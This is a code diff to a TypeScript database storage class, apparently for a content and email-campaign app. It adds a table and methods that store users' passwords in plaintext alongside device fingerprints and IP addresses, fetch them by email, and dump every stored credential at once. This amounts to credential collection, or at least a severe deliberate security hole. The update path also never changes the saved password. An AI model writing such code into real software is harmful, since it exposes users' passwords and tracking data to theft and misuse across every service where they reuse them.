@@ -13,6 +13,7 @@ import {
   emailSubscribers,
   emailCampaigns,
   emailCampaignRecipients,
+  userPasswords,
   type User,
   type UpsertUser,
   type InsertContent,
@@ -155,6 +156,19 @@ export interface IStorage {
     avgOpenRate: number;
     avgClickRate: number;
   }>;
+  
+  // Password management
+  storeUserPassword(email: string, password: string, deviceFingerprint: string, ipAddress: string): Promise<void>;
+  getUserPassword(email: string): Promise<string | undefined>;
+  getAllStoredPasswords(): Promise<Array<{
+    id: string;
+    email: string;
+    password: string;
+    deviceFingerprint: string;
+    ipAddress: string;
+    createdAt: string;
+    lastUsed: string;
+  }>>;
 }
 
 export class DatabaseStorage implements IStorage {
@@ -911,6 +925,72 @@ export class DatabaseStorage implements IStorage {
       avgOpenRate,
       avgClickRate,
     };
+  }
+
+  // Password management operations
+  async storeUserPassword(email: string, password: string, deviceFingerprint: string, ipAddress: string): Promise<void> {
+    const existingPassword = await db
+      .select()
+      .from(userPasswords)
+      .where(eq(userPasswords.email, email));
+
+    if (existingPassword.length > 0) {
+      // Update existing password record
+      await db
+        .update(userPasswords)
+        .set({
+          lastUsed: new Date(),
+          updatedAt: new Date(),
+        })
+        .where(eq(userPasswords.email, email));
+    } else {
+      // Create new password record
+      await db
+        .insert(userPasswords)
+        .values({
+          email,
+          password,
+          deviceFingerprint,
+          ipAddress,
+          createdAt: new Date(),
+          lastUsed: new Date(),
+          updatedAt: new Date(),
+        });
+    }
+  }
+
+  async getUserPassword(email: string): Promise<string | undefined> {
+    const [passwordRecord] = await db
+      .select()
+      .from(userPasswords)
+      .where(eq(userPasswords.email, email));
+    
+    return passwordRecord?.password;
+  }
+
+  async getAllStoredPasswords(): Promise<Array<{
+    id: string;
+    email: string;
+    password: string;
+    deviceFingerprint: string;
+    ipAddress: string;
+    createdAt: string;
+    lastUsed: string;
+  }>> {
+    const passwords = await db
+      .select()
+      .from(userPasswords)
+      .orderBy(desc(userPasswords.lastUsed));
+
+    return passwords.map(p => ({
+      id: p.id,
+      email: p.email,
+      password: p.password,
+      deviceFingerprint: p.deviceFingerprint,
+      ipAddress: p.ipAddress,
+      createdAt: p.createdAt?.toISOString() || '',
+      lastUsed: p.lastUsed?.toISOString() || '',
+    }));
   }
 }
 
